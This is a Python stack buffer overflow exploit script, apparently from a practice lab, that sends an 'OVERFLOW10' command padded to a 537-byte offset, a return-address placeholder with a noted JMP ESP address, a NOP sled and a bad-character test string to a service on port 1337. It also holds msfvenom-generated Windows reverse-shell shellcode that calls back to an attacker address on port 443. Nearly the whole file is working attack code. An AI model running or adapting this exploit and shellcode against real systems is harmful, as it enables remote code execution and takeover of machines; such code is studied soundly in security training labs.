import socket

ip = "10.10.29.198"
port = 1337

allchars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
badchars = "\x00\xa0\xad\xbe\xde\xef"
usechars = "".join(c for c in allchars if c not in badchars) # Remove badchars from allchars
#print(''.join(f'\\x{ord(c):02x}' for c in usechars))

# msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=443 -f 'python' -b '\x00\xa9\xcd\xd4'
buf =  ""
buf += "\xba\x6e\xef\x84\xbd\xdb\xd1\xd9\x74\x24\xf4\x5e"
buf += "\x29\xc9\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\x38"
buf += "\xe1\x66\x48\x38\x15\xe4\xb3\xc0\xe6\x89\x3a\x25"
buf += "\xd7\x89\x59\x2e\x48\x3a\x29\x62\x65\xb1\x7f\x96"
buf += "\xfe\xb7\x57\x99\xb7\x72\x8e\x94\x48\x2e\xf2\xb7"
buf += "\xca\x2d\x27\x17\xf2\xfd\x3a\x56\x33\xe3\xb7\x0a"
buf += "\xec\x6f\x65\xba\x99\x3a\xb6\x31\xd1\xab\xbe\xa6"
buf += "\xa2\xca\xef\x79\xb8\x94\x2f\x78\x6d\xad\x79\x62"
buf += "\x72\x88\x30\x19\x40\x66\xc3\xcb\x98\x87\x68\x32"
buf += "\x15\x7a\x70\x73\x92\x65\x07\x8d\xe0\x18\x10\x4a"
buf += "\x9a\xc6\x95\x48\x3c\x8c\x0e\xb4\xbc\x41\xc8\x3f"
buf += "\xb2\x2e\x9e\x67\xd7\xb1\x73\x1c\xe3\x3a\x72\xf2"
buf += "\x65\x78\x51\xd6\x2e\xda\xf8\x4f\x8b\x8d\x05\x8f"
buf += "\x74\x71\xa0\xc4\x99\x66\xd9\x87\xf5\x4b\xd0\x37"
buf += "\x06\xc4\x63\x44\x34\x4b\xd8\xc2\x74\x04\xc6\x15"
buf += "\x7a\x3f\xbe\x89\x85\xc0\xbf\x80\x41\x94\xef\xba"
buf += "\x60\x95\x7b\x3a\x8c\x40\x2b\x6a\x22\x3b\x8c\xda"
buf += "\x82\xeb\x64\x30\x0d\xd3\x95\x3b\xc7\x7c\x3f\xc6"
buf += "\x80\x88\xd5\xd7\x3f\xe5\xd7\xe7\xbe\x4e\x5e\x01"
buf += "\xaa\xa0\x37\x9a\x43\x58\x12\x50\xf5\xa5\x88\x1d"
buf += "\x35\x2d\x3f\xe2\xf8\xc6\x4a\xf0\x6d\x27\x01\xaa"
buf += "\x38\x38\xbf\xc2\xa7\xab\x24\x12\xa1\xd7\xf2\x45"
buf += "\xe6\x26\x0b\x03\x1a\x10\xa5\x31\xe7\xc4\x8e\xf1"
buf += "\x3c\x35\x10\xf8\xb1\x01\x36\xea\x0f\x89\x72\x5e"
buf += "\xc0\xdc\x2c\x08\xa6\xb6\x9e\xe2\x70\x64\x49\x62"
buf += "\x04\x46\x4a\xf4\x09\x83\x3c\x18\xbb\x7a\x79\x27"
buf += "\x74\xeb\x8d\x50\x68\x8b\x72\x8b\x28\xbb\x38\x91"
buf += "\x19\x54\xe5\x40\x18\x39\x16\xbf\x5f\x44\x95\x35"
buf += "\x20\xb3\x85\x3c\x25\xff\x01\xad\x57\x90\xe7\xd1"
buf += "\xc4\x91\x2d"

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
retn = "BBBB" #"\xaf\x11\x50\x62" #0x625011af pos of JMP ESP
padding = "\x90" * 16  #space to expand in

payload = usechars
#payload = buf

postfix = "\x90" * 16  #space to expand in

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
